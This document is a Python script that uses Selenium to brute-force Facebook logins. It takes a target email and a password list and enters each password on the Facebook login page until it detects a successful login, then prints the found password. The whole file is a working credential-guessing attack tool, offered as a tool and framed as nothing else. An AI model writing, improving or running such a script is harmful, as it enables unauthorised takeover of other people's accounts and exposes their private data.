import logging
from rich.console import Console
from rich.logging import RichHandler
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
import time,ints
import sys

# Initialize rich console
console = Console()

console.log(ints.ints, style="green")
console.log('Powered By MDAD Solutions', style="cyan")
console.log('Created By Aman', style="cyan")
console.log('Distributed under All Rights Reserved License', style="cyan")
console.log(' ')

logging.basicConfig(level=logging.INFO, format='%(message)s', handlers=[RichHandler(console=console)])
def create_webdriver():
    chrome_options = Options()
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    
    driver = webdriver.Edge(options=chrome_options)
    return driver

def choose_file():
    file_path = input("Enter the path to the password file (leave blank for default 'passs.trx'): ").strip()
    if file_path == '':
        file_path = 'passs.trx'
    return file_path

def main():
    driver = create_webdriver()
    file_path = choose_file()
    if not file_path:
        console.log("No file selected. Exiting...", style="red")
        sys.exit()

    email = input('Enter Email/Username: ')
    console.log(f'\nTarget Email ID: {email}', style="cyan")
    logging.info(f'Target Email ID: {email}')
    console.log('\nTrying passwords from list...', style="cyan")
    logging.info('Trying passwords from list...')

    try:
        with open(file_path, 'r', encoding='utf-8') as file:
            for i, line in enumerate(file, start=1):
                password = line.strip()
                if len(password) < 6:
                    continue
                password_message = f'{i}: {password}'
                console.log(password_message, style="white")
                logging.info(password_message)
                if try_login(driver, email, password):
                    console.log("Stopping further attempts as login was successful.", style="cyan")
                    break  # Exit loop on successful login
    except FileNotFoundError:
        console.log(f"File '{file_path}' not found. Exiting...", style="red")
        sys.exit()

    time.sleep(5)
    logging.info('Script finished.')
    driver.quit()

def try_login(driver, email, password):
    driver.get('https://www.facebook.com/login.php')
    log_message = f'Trying email: {email} with password: {password}'
    console.log(log_message, style="yellow")

    try:
        email_input = driver.find_element(By.NAME, 'email')
        password_input = driver.find_element(By.NAME, 'pass')
        login_button = driver.find_element(By.NAME, 'login')

        email_input.send_keys(email)
        password_input.send_keys(password)
        login_button.click()

        time.sleep(5)
        if "home" in driver.current_url or "profile" in driver.current_url or "Find Friends" in driver.page_source:
            success_message = f'Password found: {password}'
            console.log(success_message, style="green")
            logging.info(success_message)
            return True

        if "login" in driver.current_url or "login_attempt" in driver.page_source:
            error_message = f'Login failed for password: {password}'
            console.log(error_message, style="red")
            logging.info(error_message)
            return False

    except Exception as e:
        error_message = f"An error occurred: {e}"
        console.log(error_message, style="red")
        logging.error(error_message)

    return False

if __name__ == "__main__":
    main()
